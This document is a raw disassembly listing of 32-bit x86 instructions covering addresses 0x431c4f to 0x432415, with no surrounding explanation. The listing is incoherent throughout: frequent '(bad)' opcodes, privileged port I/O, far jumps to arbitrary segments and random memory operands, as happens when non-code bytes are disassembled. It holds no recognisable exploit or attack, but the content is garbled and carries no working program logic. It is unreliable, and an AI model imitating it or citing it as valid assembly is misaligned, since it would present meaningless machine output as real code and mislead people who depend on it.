  431c4f:	and    edx,ecx
  431c51:	adc    DWORD PTR [ebp+0xbfc0d49],edi
  431c57:	outs   dx,BYTE PTR ds:[esi]
  431c58:	sub    esi,DWORD PTR [edi+0x21aa376]
  431c5e:	lahf   
  431c5f:	xchg   edx,eax
  431c60:	(bad)  
  431c61:	jmp    0x431c3b
  431c63:	or     dh,BYTE PTR [eax-0x1f5d4993]
  431c69:	scas   al,BYTE PTR es:[edi]
  431c6a:	dec    esp
  431c6b:	loopne 0x431c73
  431c6d:	mov    eax,ds:0xcfa15ba2
  431c72:	das    
  431c73:	out    dx,al
  431c74:	cmp    cl,dl
  431c76:	or     BYTE PTR [esi-0x5b],ch
  431c79:	stos   BYTE PTR es:[edi],al
  431c7a:	xchg   ebx,eax
  431c7b:	xchg   esi,eax
  431c7c:	add    dl,BYTE PTR [eax]
  431c7e:	jge    0x431cc1
  431c80:	jne    0x431c23
  431c82:	mov    DWORD PTR [esp],ebx
  431c85:	xchg   ecx,eax
  431c86:	cs je  0x431c91
  431c89:	fsubr  DWORD PTR [esi]
  431c8b:	xor    al,0xde
  431c8d:	mov    al,ds:0xcbc90e64
  431c92:	cmp    edx,DWORD PTR ds:0x20ec101d
  431c98:	add    eax,0x6e50b839
  431c9d:	pop    ebp
  431c9e:	inc    eax
  431c9f:	sbb    esi,ebp
  431ca1:	push   ss
  431ca2:	bound  ebx,QWORD PTR [eax-0x554086a1]
  431ca8:	dec    esp
  431ca9:	sub    al,0x94
  431cab:	lods   eax,DWORD PTR ds:[esi]
  431cac:	jns    0x431c97
  431cae:	int    0x82
  431cb0:	in     eax,dx
  431cb1:	ret    0x83d6
  431cb4:	mov    bl,0x16
  431cb6:	inc    ebx
  431cb7:	cmp    BYTE PTR [edi+0x5f],bh
  431cba:	mov    bh,0x4a
  431cbc:	aaa    
  431cbd:	push   0xd128a400
  431cc2:	outs   dx,DWORD PTR ds:[esi]
  431cc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431cc4:	stos   BYTE PTR es:[edi],al
  431cc5:	ins    DWORD PTR es:[edi],dx
  431cc6:	pop    ss
  431cc7:	inc    ebp
  431cc8:	xchg   edi,eax
  431cc9:	(bad)  
  431cca:	data16 test BYTE PTR [eax+eiz*1-0x27],bl
  431ccf:	sub    al,0x58
  431cd1:	push   0xa3b188bb
  431cd6:	jne    0x431c5a
  431cd8:	xchg   ebp,eax
  431cd9:	jns    0x431ce4
  431cdb:	pop    ebx
  431cdc:	pop    es
  431cdd:	add    eax,0xa423a437
  431ce2:	mov    esp,0x6c0c927e
  431ce7:	add    al,BYTE PTR [eax-0x1d7541f5]
  431ced:	enter  0x9c80,0xbb
  431cf1:	mov    al,0x75
  431cf3:	add    eax,0xd16e701e
  431cf8:	fmul   QWORD PTR [ebp-0x58]
  431cfb:	ja     0x431d05
  431cfd:	cs ins BYTE PTR es:[edi],dx
  431cff:	pop    ebx
  431d00:	fst    QWORD PTR [eax]
  431d02:	adc    DWORD PTR [edx],edx
  431d04:	jl     0x431d4e
  431d06:	fimul  DWORD PTR [ebx+0x4d]
  431d09:	add    al,0x3b
  431d0b:	jae    0x431ca9
  431d0d:	jo     0x431ce4
  431d0f:	call   0xa00b:0xb510dbad
  431d16:	pop    esi
  431d17:	xor    ah,BYTE PTR [edi-0x41a7a728]
  431d1d:	ror    BYTE PTR [ecx],1
  431d1f:	xchg   DWORD PTR [eax+0x7f],eax
  431d22:	or     eax,DWORD PTR [eax]
  431d24:	mov    eax,0x8581dc6d
  431d29:	gs arpl bx,bx
  431d2c:	jmp    FWORD PTR [ecx+edx*1-0x50618432]
  431d33:	mov    al,ds:0xd1430805
  431d38:	(bad)  
  431d39:	sbb    BYTE PTR [ebx-0x46],dl
  431d3c:	or     eax,DWORD PTR [ebp+0x4d]
  431d3f:	ror    DWORD PTR [edi+0x8d1d2b8],0x91
  431d46:	sbb    ebx,DWORD PTR [ebx+0x7]
  431d49:	push   ecx
  431d4a:	in     al,0xe9
  431d4c:	add    eax,0x1c1b5d4f
  431d51:	or     eax,0xe6e183f0
  431d56:	inc    esp
  431d57:	xor    esi,DWORD PTR [ebx+0x7b]
  431d5a:	pusha  
  431d5b:	ins    DWORD PTR es:[edi],dx
  431d5c:	lahf   
  431d5d:	mov    dh,0x28
  431d5f:	mov    ?,WORD PTR [eax]
  431d61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431d62:	push   edx
  431d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431d64:	bound  edx,QWORD PTR [eax-0x1e]
  431d67:	push   edx
  431d68:	add    esi,DWORD PTR [ebp+0x58902220]
  431d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431d6f:	or     eax,0x685cb4aa
  431d74:	test   al,0x3c
  431d76:	jno    0x431d5d
  431d78:	pop    ds
  431d79:	add    eax,esp
  431d7b:	or     BYTE PTR [eax-0x25],ah
  431d7e:	add    bl,ah
  431d80:	out    dx,eax
  431d81:	jle    0x431d8e
  431d83:	ret    0x52c6
  431d86:	sub    DWORD PTR [edx],edi
  431d88:	add    al,0xab
  431d8a:	inc    eax
  431d8b:	jecxz  0x431d95
  431d8d:	adc    bl,ah
  431d8f:	fiadd  DWORD PTR [esi]
  431d91:	loopne 0x431d25
  431d93:	adc    BYTE PTR [esp+edx*1-0x7f7fd351],al
  431d9a:	(bad)  
  431d9b:	loopne 0x431ddf
  431d9d:	push   edi
  431d9e:	adc    al,0x63
  431da0:	sbb    dl,BYTE PTR [ecx+0x2b5b7542]
  431da6:	cmp    cl,BYTE PTR [eax]
  431da8:	xchg   esp,eax
  431da9:	xor    eax,0x42252378
  431dae:	mov    ah,0xb5
  431db0:	or     ecx,DWORD PTR [edi-0x34]
  431db3:	lods   al,BYTE PTR ds:[esi]
  431db4:	mov    ebp,eax
  431db6:	(bad)  
  431db7:	jo     0x431e0d
  431db9:	shr    BYTE PTR [ebp+0x28c4faad],0x2d
  431dc0:	inc    esi
  431dc1:	mov    DWORD PTR [esi],0xbe0c3600
  431dc7:	pushf  
  431dc8:	push   es
  431dc9:	dec    esi
  431dca:	ss and ebx,ebx
  431dcd:	(bad)  
  431dce:	outs   dx,BYTE PTR ds:[esi]
  431dcf:	fucomi st,st(7)
  431dd1:	repnz pop esp
  431dd3:	and    DWORD PTR es:[ebp+eax*8+0x78b68a17],eax
  431ddb:	jbe    0x431df1
  431ddd:	shl    dl,0x57
  431de0:	add    BYTE PTR [ecx],cl
  431de2:	xchg   ebp,eax
  431de3:	xchg   edi,eax
  431de4:	or     al,0x9c
  431de6:	(bad)  
  431de7:	adc    eax,0x4f22eb71
  431dec:	or     BYTE PTR [ecx+0x35],al
  431def:	mov    esi,0xd4b6e02b
  431df4:	into   
  431df5:	std    
  431df6:	or     ebp,DWORD PTR [esi+0x11]
  431df9:	or     DWORD PTR [ebx-0x31],ebx
  431dfc:	or     BYTE PTR [esi],dh
  431dfe:	add    eax,0xe5b357b1
  431e03:	push   ebx
  431e04:	dec    ebx
  431e05:	je     0x431daa
  431e07:	mov    al,0x83
  431e09:	dec    edx
  431e0a:	mov    bh,0x40
  431e0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431e0d:	push   esp
  431e0e:	aaa    
  431e0f:	in     al,0x51
  431e11:	mov    ah,0x85
  431e13:	sbb    eax,0xaf653b7c
  431e18:	sub    ebp,DWORD PTR [eax+0x15]
  431e1b:	pop    ss
  431e1c:	mov    dh,0xb6
  431e1e:	push   ebx
  431e1f:	fwait
  431e20:	mov    WORD PTR [edx],es
  431e22:	les    ebx,FWORD PTR [edi]
  431e24:	gs inc ecx
  431e26:	ins    BYTE PTR es:[edi],dx
  431e27:	rcl    BYTE PTR [edx+0x7],0x3c
  431e2b:	cmp    cl,BYTE PTR [ebx]
  431e2d:	jmp    FWORD PTR [eax+0x5d6e209d]
  431e33:	inc    ecx
  431e34:	or     esi,esp
  431e36:	mov    dh,0xe3
  431e38:	dec    edx
  431e39:	inc    edi
  431e3a:	jo     0x431e17
  431e3c:	mov    edx,0x83b9ddf6
  431e41:	rcr    edi,1
  431e43:	call   0xbe5b:0xa22ba928
  431e4a:	dec    edx
  431e4b:	and    al,cl
  431e4d:	in     al,0x66
  431e4f:	mov    al,0x3
  431e51:	sbb    BYTE PTR ds:0x969cf670,0x44
  431e58:	or     esp,DWORD PTR es:[edx+0x7a0856e]
  431e5f:	cmp    BYTE PTR [edi+0x3a],al
  431e62:	add    eax,0xaec4101d
  431e67:	and    DWORD PTR [eax],ebx
  431e69:	xchg   BYTE PTR [ebx-0x54522bf6],dl
  431e6f:	mov    BYTE PTR [edx+0x19],ch
  431e72:	loopne 0x431e1e
  431e74:	ins    DWORD PTR es:[edi],dx
  431e75:	jnp    0x431e92
  431e77:	in     eax,dx
  431e78:	(bad)  
  431e79:	inc    esp
  431e7a:	mov    edi,0xfd785327
  431e7f:	mov    WORD PTR [eax],ds
  431e81:	push   0xa0ae8dda
  431e86:	jbe    0x431e10
  431e88:	mov    ebx,0x537e7c3c
  431e8d:	sub    eax,ebp
  431e8f:	(bad)  
  431e90:	sub    bh,ch
  431e92:	into   
  431e93:	jae    0x431ee2
  431e95:	jecxz  0x431f01
  431e97:	retf   
  431e98:	shl    BYTE PTR [esi+0x6c296678],cl
  431e9e:	loopne 0x431e62
  431ea0:	sbb    bh,BYTE PTR [ebp-0x3e]
  431ea3:	mov    dh,0x51
  431ea5:	mov    al,ds:0x1d4b3662
  431eaa:	jmp    0x431ef2
  431eac:	mov    eax,ds:0xdedb8aa3
  431eb1:	xor    al,BYTE PTR [edx]
  431eb3:	or     DWORD PTR [ebx+0x5b],edx
  431eb6:	cmp    cl,BYTE PTR [ebp+0x55]
  431eb9:	jno    0x431f24
  431ebb:	adc    al,0x6b
  431ebd:	add    al,0x30
  431ebf:	dec    edi
  431ec0:	push   eax
  431ec1:	fcom   QWORD PTR [esi-0x717993d1]
  431ec7:	pop    eax
  431ec8:	(bad)  
  431ec9:	lods   al,BYTE PTR ds:[esi]
  431eca:	add    BYTE PTR [ebx+0x538d65de],cl
  431ed0:	(bad)  
  431ed2:	ins    DWORD PTR es:[edi],dx
  431ed3:	sub    ebx,DWORD PTR [ecx]
  431ed5:	mov    ecx,0x2c422359
  431eda:	sbb    eax,0xa0c5fe0e
  431edf:	fild   DWORD PTR [edx+0x57]
  431ee2:	push   ds
  431ee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431ee4:	test   DWORD PTR [ecx+ebp*1],0x5117726b
  431eeb:	mov    bh,0xba
  431eed:	stos   BYTE PTR es:[edi],al
  431eee:	shl    edx,cl
  431ef0:	arpl   WORD PTR [edx+0x6e8abb76],di
  431ef6:	pop    ebx
  431ef7:	into   
  431ef8:	xor    eax,0xc30e2023
  431efd:	sti    
  431efe:	dec    ebp
  431eff:	pop    ecx
  431f00:	mov    DWORD PTR [ebx-0x57],ebx
  431f03:	push   0x63ddb58f
  431f08:	data16 cmp al,BYTE PTR [edx]
  431f0b:	je     0x431f62
  431f0d:	lock rcr BYTE PTR [ebx-0x14],cl
  431f11:	leave  
  431f12:	dec    esp
  431f13:	pusha  
  431f14:	inc    ebx
  431f15:	adc    ebx,ebx
  431f17:	push   eax
  431f18:	sub    DWORD PTR [ecx],ecx
  431f1a:	test   DWORD PTR [edi+eiz*1],edi
  431f1d:	add    al,0xb
  431f1f:	fwait
  431f20:	or     BYTE PTR [ebp+0x6373470d],bh
  431f26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431f27:	add    dl,ah
  431f29:	add    eax,0x7444c532
  431f2e:	fcmovnbe st,st(6)
  431f30:	add    eax,0x712270d5
  431f35:	(bad)  
  431f36:	imul   edx,DWORD PTR [edi-0x49720b65],0x2b
  431f3d:	test   al,0x73
  431f3f:	fidivr DWORD PTR [esi-0x592dbb88]
  431f45:	jmp    0x5548:0x3107adf2
  431f4c:	add    al,cl
  431f4e:	gs je  0x431f81
  431f51:	inc    ecx
  431f52:	pop    esp
  431f53:	fidiv  DWORD PTR [esi-0x1652d039]
  431f59:	das    
  431f5a:	pop    esp
  431f5b:	dec    ecx
  431f5c:	or     eax,0x4d8a0aec
  431f61:	(bad)  
  431f62:	popa   
  431f63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431f64:	pusha  
  431f65:	cs mov ebx,0x443554ab
  431f6b:	xor    eax,0xd8bb3f33
  431f70:	add    DWORD PTR ss:[eax-0x57],esi
  431f74:	call   0x38c0f7e0
  431f79:	lods   al,BYTE PTR ds:[esi]
  431f7a:	fsubr  QWORD PTR [eax]
  431f7c:	mov    bh,0xe
  431f7e:	add    BYTE PTR [edi],dl
  431f80:	xchg   ebp,eax
  431f81:	aas    
  431f82:	jbe    0x431fff
  431f84:	bound  ebp,QWORD PTR es:[ebx]
  431f87:	mov    edx,0x1d5315d0
  431f8c:	dec    edi
  431f8d:	in     al,0x36
  431f8f:	jo     0x431fd7
  431f91:	xor    al,0x50
  431f93:	mov    ch,0x32
  431f95:	nop
  431f96:	inc    edx
  431f97:	xor    al,0x47
  431f99:	push   esi
  431f9a:	inc    ebx
  431f9b:	push   ebp
  431f9c:	mov    bh,0xfe
  431f9e:	lds    edx,FWORD PTR [ebx+0x7d]
  431fa1:	dec    esp
  431fa2:	push   0x15
  431fa4:	cmp    ecx,DWORD PTR [edx-0x1f922013]
  431faa:	jge    0x431fed
  431fac:	sahf   
  431fad:	cdq    
  431fae:	ins    DWORD PTR es:[edi],dx
  431faf:	stos   BYTE PTR es:[edi],al
  431fb0:	(bad)  
  431fb1:	fist   DWORD PTR [ebp+eax*2-0x6e]
  431fb5:	xchg   ebp,eax
  431fb6:	push   0x9b565cdc
  431fbb:	sbb    dl,0x1
  431fbe:	hlt    
  431fbf:	mov    bh,bh
  431fc1:	and    al,0xbc
  431fc3:	cmp    eax,0x6b637411
  431fc8:	sahf   
  431fc9:	sbb    bl,BYTE PTR [eax-0x17f51fac]
  431fcf:	and    bh,BYTE PTR [edx+0x5988f0d4]
  431fd5:	in     eax,dx
  431fd6:	imul   eax,DWORD PTR [esi],0x6c2896f4
  431fdc:	fmul   QWORD PTR [ecx]
  431fde:	mov    eax,ds:0x1f49a2ab
  431fe3:	jae    0x431f69
  431fe5:	ss add ah,bl
  431fe8:	fimul  WORD PTR ss:[ebx-0x71]
  431fec:	mov    eax,ds:0xd1ddb84d
  431ff1:	jne    0x431f9e
  431ff3:	mov    eax,ds:0xfdc57202
  431ff8:	inc    ecx
  431ff9:	les    edi,FWORD PTR [eax+0x2a1075b1]
  431fff:	std    
  432000:	and    dh,ah
  432002:	xor    dl,bl
  432004:	jmp    0x95a8:0x806b7100
  43200b:	rol    ecx,1
  43200d:	mov    ah,0xec
  43200f:	cmp    BYTE PTR [edx-0x1ff57acb],0x11
  432016:	fwait
  432017:	push   ds
  432018:	fst    DWORD PTR [ecx+0x2c]
  43201b:	ins    DWORD PTR es:[edi],dx
  43201c:	pop    ebp
  43201d:	push   ebp
  43201e:	in     al,0x2f
  432020:	xchg   edx,eax
  432021:	ret    0xb498
  432024:	add    eax,0x792e87c1
  432029:	inc    edx
  43202a:	mov    gs,ecx
  43202c:	or     al,0x81
  43202e:	rcl    edx,0xd2
  432031:	(bad)  
  432032:	sahf   
  432033:	jb     0x4320ac
  432035:	or     eax,0xe935a062
  43203a:	ret    0x6c51
  43203d:	pop    ebx
  43203e:	sbb    eax,0x5f7c9bf6
  432043:	ficom  DWORD PTR [eax-0x40]
  432046:	lea    esp,[eax+ebp*1+0x7f10d571]
  43204d:	push   esp
  43204e:	fnstsw WORD PTR [edx]
  432050:	sub    ah,BYTE PTR [eax+edi*2]
  432053:	(bad)  
  432054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432055:	adc    eax,0x5db5b8aa
  43205a:	sbb    esp,DWORD PTR [eax]
  43205c:	out    dx,eax
  43205d:	pop    ecx
  43205e:	shl    DWORD PTR [ebp-0x2527a548],1
  432064:	mov    gs,WORD PTR [ecx+ebx*4]
  432067:	in     al,dx
  432068:	jno    0x432005
  43206a:	mov    cl,0x7c
  43206c:	pop    esi
  43206d:	repnz or ebx,DWORD PTR [ebx-0x5f]
  432071:	into   
  432072:	mov    dh,0x45
  432074:	mov    esi,0x8a002204
  432079:	dec    edi
  43207a:	adc    edx,DWORD PTR [ecx-0x25]
  43207d:	test   ecx,esi
  43207f:	sbb    DWORD PTR [eax-0x24e8b7e0],ebx
  432085:	ret    0x46c6
  432088:	xor    BYTE PTR [ecx+0x7fd85740],0x93
  43208f:	push   eax
  432090:	sbb    ebx,DWORD PTR [ebp-0x26]
  432093:	push   0xffffffaa
  432095:	out    dx,eax
  432096:	sbb    DWORD PTR gs:[edx-0x20301663],0x360a299
  4320a1:	mov    eax,ds:0xb5bd353
  4320a6:	retf   
  4320a7:	inc    edx
  4320a8:	mov    eax,ds:0x10e279d0
  4320ad:	sub    bh,BYTE PTR [esi+0x36a2bb17]
  4320b3:	mov    dh,0xd4
  4320b5:	sub    DWORD PTR [eax-0x70],esp
  4320b8:	sub    DWORD PTR [ecx+ecx*8-0x5c8a4a64],esi
  4320bf:	ins    DWORD PTR es:[edi],dx
  4320c0:	fnstsw WORD PTR [edx-0xdb278b6]
  4320c6:	icebp  
  4320c7:	sbb    al,0x8e
  4320c9:	mov    bl,al
  4320cb:	inc    ecx
  4320cc:	fdiv   QWORD PTR [ebx+0x56]
  4320cf:	test   eax,eax
  4320d1:	ins    DWORD PTR es:[edi],dx
  4320d2:	sub    DWORD PTR [ebp-0x287192c3],0x62
  4320d9:	sti    
  4320da:	daa    
  4320db:	and    BYTE PTR [ebx],ch
  4320dd:	mov    edx,0x4d681362
  4320e2:	sahf   
  4320e3:	pusha  
  4320e4:	pop    ebx
  4320e5:	in     eax,dx
  4320e6:	mov    ebx,0x356d6c2d
  4320eb:	mov    dh,0x6e
  4320ed:	icebp  
  4320ee:	shr    BYTE PTR [ebx],1
  4320f0:	clc    
  4320f1:	inc    ebp
  4320f2:	jmp    FWORD PTR [esi-0x3f]
  4320f5:	lods   eax,DWORD PTR ds:[esi]
  4320f6:	mov    esp,DWORD PTR [eax+0x52]
  4320f9:	into   
  4320fa:	repz mov dh,0x6b
  4320fd:	nop
  4320fe:	and    dh,BYTE PTR cs:[esi]
  432101:	push   eax
  432102:	fwait
  432103:	inc    ebp
  432104:	(bad)  
  432105:	mov    edi,0x8db74057
  43210a:	sub    eax,0xc577541b
  43210f:	mov    ebp,0xe5883a3d
  432114:	inc    esi
  432115:	jmp    0x7f91632
  43211a:	xor    ebp,DWORD PTR [edi-0x23ebc9d1]
  432120:	xchg   ebp,eax
  432121:	arpl   WORD PTR [ecx+eax*1-0x65],dx
  432125:	jmp    0xafc4:0x44d6d23f
  43212c:	push   0x54
  43212e:	in     al,0xf8
  432130:	(bad)  
  432131:	or     BYTE PTR [eax-0x5c2eb552],ch
  432137:	fimul  DWORD PTR [eax]
  432139:	outs   dx,DWORD PTR ds:[esi]
  43213a:	(bad)  
  43213b:	add    DWORD PTR ds:0x9b2993bb,eax
  432141:	cdq    
  432142:	mov    bl,0x20
  432144:	cmp    eax,DWORD PTR [edx+0x28adb0b]
  43214a:	out    dx,al
  43214b:	dec    edi
  43214c:	fsubp  st(7),st
  43214e:	fs std 
  432150:	popa   
  432151:	adc    al,0x6c
  432153:	retf   
  432154:	add    ch,BYTE PTR [eax+0x7589c7e4]
  43215a:	sbb    edx,0x945836af
  432160:	das    
  432161:	ja     0x4321ae
  432163:	sti    
  432164:	jecxz  0x432122
  432166:	ins    DWORD PTR es:[edi],dx
  432167:	xor    al,0x6e
  432169:	pop    ebx
  43216a:	cmp    ebp,DWORD PTR ds:0x697a51da
  432170:	ror    BYTE PTR [eax],cl
  432172:	scas   al,BYTE PTR es:[edi]
  432173:	loopne 0x43212b
  432175:	mov    ch,0x74
  432177:	call   0xa4e6:0x17bc5dc1
  43217e:	ins    DWORD PTR es:[edi],dx
  43217f:	add    BYTE PTR [eax+0x13],ch
  432182:	test   DWORD PTR [ecx+0x6bfa3ed3],ebp
  432188:	and    ebx,eax
  43218a:	adc    al,0xb1
  43218c:	xchg   BYTE PTR [ebx+0x5ee649a2],cl
  432192:	sbb    edx,ebp
  432194:	push   ecx
  432195:	mov    cl,0x3d
  432197:	fisttp DWORD PTR [ecx-0x5db2dbab]
  43219d:	outs   dx,BYTE PTR ds:[esi]
  43219e:	mov    eax,0x63b44468
  4321a3:	push   0xfffffffa
  4321a5:	inc    ebx
  4321a6:	ror    BYTE PTR [ebp-0x91dc5d2],1
  4321ac:	cmp    al,0xc4
  4321ae:	and    bl,BYTE PTR [edx-0x1ab91ffe]
  4321b4:	jmp    0x5285:0x8619d2a8
  4321bb:	push   eax
  4321bc:	add    ah,BYTE PTR [esi-0x155c8fe5]
  4321c2:	push   edi
  4321c3:	fisttp DWORD PTR [esi+ecx*8]
  4321c6:	sbb    esi,0x20
  4321c9:	add    DWORD PTR [edx],esi
  4321cb:	loope  0x43221d
  4321cd:	inc    edi
  4321ce:	aad    0xad
  4321d0:	mov    dl,0xc2
  4321d2:	mov    ebx,0xd632124d
  4321d7:	adc    ah,dl
  4321d9:	(bad)  
  4321da:	out    dx,eax
  4321db:	fbld   TBYTE PTR [edx+0x73]
  4321de:	mov    esp,0xd0113880
  4321e3:	push   es
  4321e4:	rcl    ecx,1
  4321e6:	loopne 0x4321df
  4321e8:	ins    BYTE PTR es:[edi],dx
  4321e9:	fild   DWORD PTR [edx]
  4321eb:	rol    BYTE PTR [esi+eax*1+0x4e5308de],1
  4321f2:	out    dx,eax
  4321f3:	shl    BYTE PTR [esi-0x71baa278],cl
  4321f9:	dec    esp
  4321fa:	and    DWORD PTR [edi-0x3b04927e],esi
  432200:	sub    al,0x32
  432202:	aaa    
  432203:	push   ds
  432204:	repz mov bl,0x99
  432207:	aam    0xce
  432209:	arpl   WORD PTR [ebx+0x61],bp
  43220c:	imul   eax,DWORD PTR [esi-0x23e83790],0x4e
  432213:	pop    esi
  432214:	rcl    DWORD PTR [esi+0x6d8ddb40],cl
  43221a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43221b:	dec    ebp
  43221c:	aas    
  43221d:	jnp    0x432222
  43221f:	or     al,0x68
  432221:	add    DWORD PTR [edx-0x60b25d52],ecx
  432227:	imul   edi,DWORD PTR [ecx],0xffffff80
  43222a:	and    ebx,ebx
  43222c:	cs xor eax,0xcf459b36
  432232:	push   cs
  432233:	out    0x3f,eax
  432235:	bound  edx,QWORD PTR [edx]
  432237:	(bad)  
  432238:	pop    ebx
  432239:	mov    ebx,0x144c6d6d
  43223e:	sbb    dl,ch
  432240:	jp     0x4322b6
  432242:	adc    DWORD PTR [esi+0x142ace32],ebx
  432248:	mov    edx,0xf6d2c4a8
  43224d:	xchg   ecx,eax
  43224e:	imul   ebp,DWORD PTR [ebp+0x3b],0xffffffa2
  432252:	pop    eax
  432253:	jp     0x43228a
  432255:	adc    BYTE PTR [ebx-0x52036431],dl
  43225b:	ins    DWORD PTR es:[edi],dx
  43225c:	jno    0x432201
  43225e:	and    esp,DWORD PTR [ebp+0x16122405]
  432264:	push   ebx
  432265:	das    
  432266:	ret    0x14d6
  432269:	shl    ebx,0x8c
  43226c:	cmp    BYTE PTR [eax],cl
  43226e:	mov    eax,ds:0xb6c42298
  432273:	test   eax,0xcf7ab5e8
  432278:	mov    ds:0xd63c2c02,al
  43227d:	cs je  0x4322d4
  432280:	test   DWORD PTR [ebp-0x6f],ebp
  432283:	jno    0x4322da
  432285:	sbb    BYTE PTR [ebx-0x1576497f],0x9b
  43228c:	inc    edx
  43228d:	nop
  43228e:	popa   
  43228f:	dec    eax
  432290:	sub    al,0xc0
  432292:	inc    edx
  432293:	push   ebx
  432294:	shl    BYTE PTR [esi+0x1c],0xd4
  432298:	out    0x59,al
  43229a:	or     eax,0x171bf70e
  43229f:	(bad)  
  4322a1:	ss retf 0xe9c5
  4322a5:	(bad)  
  4322a6:	pop    ss
  4322a7:	push   edx
  4322a8:	fnstsw WORD PTR [ebx+0x2a]
  4322ab:	sahf   
  4322ac:	(bad)  
  4322ad:	add    al,0xb5
  4322af:	sub    eax,0x92ab8694
  4322b4:	leave  
  4322b5:	dec    edx
  4322b6:	call   0xf41e913b
  4322bb:	and    al,ch
  4322bd:	sub    DWORD PTR ds:0x555c64d0,edi
  4322c3:	fsubr  QWORD PTR [eax]
  4322c5:	pop    esp
  4322c6:	pop    ebx
  4322c7:	test   BYTE PTR [ebx-0x49c6ae42],al
  4322cd:	ins    BYTE PTR es:[edi],dx
  4322ce:	test   DWORD PTR [ebx+0xd],ebx
  4322d1:	inc    ebp
  4322d2:	xor    eax,0x649a2bd6
  4322d7:	es popf 
  4322d9:	add    DWORD PTR [esi+0x23162e08],0x33e5e5b4
  4322e3:	jbe    0x432336
  4322e5:	jno    0x432348
  4322e7:	stos   DWORD PTR es:[edi],eax
  4322e8:	popf   
  4322e9:	jae    0x432360
  4322eb:	addr16 mov bl,0x1d
  4322ee:	shr    BYTE PTR [ebp+0x190f2821],1
  4322f4:	mov    dh,0xde
  4322f6:	bound  eax,QWORD PTR [ebx]
  4322f8:	add    ch,BYTE PTR [esi+0x5d]
  4322fb:	adc    al,0x51
  4322fd:	or     BYTE PTR [esi+eiz*4],bl
  432300:	(bad)  
  432302:	(bad)  
  432303:	add    eax,0x3d86b7b5
  432308:	pop    ebp
  432309:	out    0x9,al
  43230b:	addr16 jne 0x432313
  43230e:	sbb    esp,DWORD PTR [eax-0x558ad515]
  432314:	lahf   
  432315:	imul   ebp,DWORD PTR [edx-0x4b7d9248],0xffffffe6
  43231c:	mov    eax,ds:0x56f89722
  432321:	(bad)  
  432322:	add    eax,0x77c976d4
  432327:	repnz adc ch,BYTE PTR ds:[edx+0x53]
  43232c:	fisttp DWORD PTR [esi+0x79bdd6e2]
  432332:	adc    eax,DWORD PTR [esi-0x52e6f750]
  432338:	jg     0x4322f0
  43233a:	dec    ebp
  43233b:	push   eax
  43233c:	ins    DWORD PTR es:[edi],dx
  43233d:	mov    bl,0xcd
  43233f:	push   esp
  432340:	sbb    ebx,esi
  432342:	mov    al,0xa
  432344:	in     al,dx
  432345:	add    al,ah
  432347:	(bad)  
  432348:	pop    ecx
  432349:	sub    al,0x9c
  43234b:	or     ch,BYTE PTR [eax+0x57]
  43234e:	mov    gs,WORD PTR [ebp-0x5f]
  432351:	or     eax,DWORD PTR [edi]
  432353:	adc    bl,BYTE PTR [edi+0x26592eaf]
  432359:	pop    ss
  43235a:	sbb    dh,BYTE PTR [edi]
  43235c:	xchg   esi,eax
  43235d:	scas   eax,DWORD PTR es:[edi]
  43235e:	cmp    eax,0xab4aee3f
  432363:	pop    es
  432364:	xchg   ebx,eax
  432365:	enter  0x414a,0x53
  432369:	push   ebp
  43236a:	pop    ebp
  43236b:	jns    0x432370
  43236d:	pop    edx
  43236e:	fdiv   DWORD PTR [esi]
  432370:	fdiv   DWORD PTR [ecx+edx*4-0x56]
  432374:	push   eax
  432375:	or     DWORD PTR [esi+0x28],0x76
  432379:	cmp    ecx,DWORD PTR [eax]
  43237b:	pusha  
  43237c:	mov    ds:0x4746554c,eax
  432381:	shr    BYTE PTR [edx],cl
  432383:	pusha  
  432384:	add    eax,DWORD PTR ds:0x6a03a59f
  43238a:	pop    ebx
  43238b:	sub    bl,BYTE PTR [edx-0x558f7ee7]
  432391:	mov    bl,0xb6
  432393:	je     0x4323aa
  432395:	mov    cl,0x2b
  432397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432398:	push   esp
  432399:	xchg   edi,eax
  43239a:	retf   0xd450
  43239d:	test   DWORD PTR [edi],esp
  43239f:	cs popa 
  4323a1:	ins    BYTE PTR es:[edi],dx
  4323a2:	jbe    0x43241a
  4323a4:	outs   dx,BYTE PTR ds:[esi]
  4323a5:	(bad)  
  4323a6:	and    eax,0xd6c56dc9
  4323ab:	inc    ecx
  4323ac:	pop    ebp
  4323ad:	je     0x4323e4
  4323af:	mov    BYTE PTR [ebp+0x9],bl
  4323b2:	rcl    dh,cl
  4323b4:	inc    ecx
  4323b5:	mov    cl,0x5f
  4323b7:	shr    BYTE PTR [ebx+0x50c39e15],cl
  4323bd:	(bad)  [esi-0x3d8a12f0]
  4323c3:	cmp    edi,edi
  4323c5:	cli    
  4323c6:	pop    ecx
  4323c7:	mov    eax,ds:0x6a83cfce
  4323cc:	pop    ebp
  4323cd:	push   0x5
  4323cf:	je     0x4323ac
  4323d1:	push   ds
  4323d2:	xor    al,0x8
  4323d4:	mov    eax,ds:0x456a0ba2
  4323d9:	add    al,0xb8
  4323db:	(bad)  
  4323dc:	mov    BYTE PTR [esi],cl
  4323de:	sub    BYTE PTR [ebp+0x3c],0xb3
  4323e2:	xchg   ebx,eax
  4323e3:	jl     0x432394
  4323e5:	mov    ebx,0x5eb6d8a2
  4323ea:	outs   dx,DWORD PTR ds:[esi]
  4323eb:	dec    ebp
  4323ec:	or     BYTE PTR gs:[esi+0x746edafa],al
  4323f3:	push   esp
  4323f4:	std    
  4323f5:	mov    bl,0xe1
  4323f7:	pop    ds
  4323f8:	das    
  4323f9:	dec    edx
  4323fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4323fb:	pop    ss
  4323fc:	adc    esp,ebp
  4323fe:	xor    dh,0x3e
  432401:	push   edx
  432402:	sub    eax,0x6a2bab6d
  432407:	mov    esi,DWORD PTR [edx+0x680a6a21]
  43240d:	pop    ecx
  43240e:	push   edi
  43240f:	add    al,0x37
  432411:	(bad)  
  432413:	jno    0x432441
  432415:	jnp    0x432413
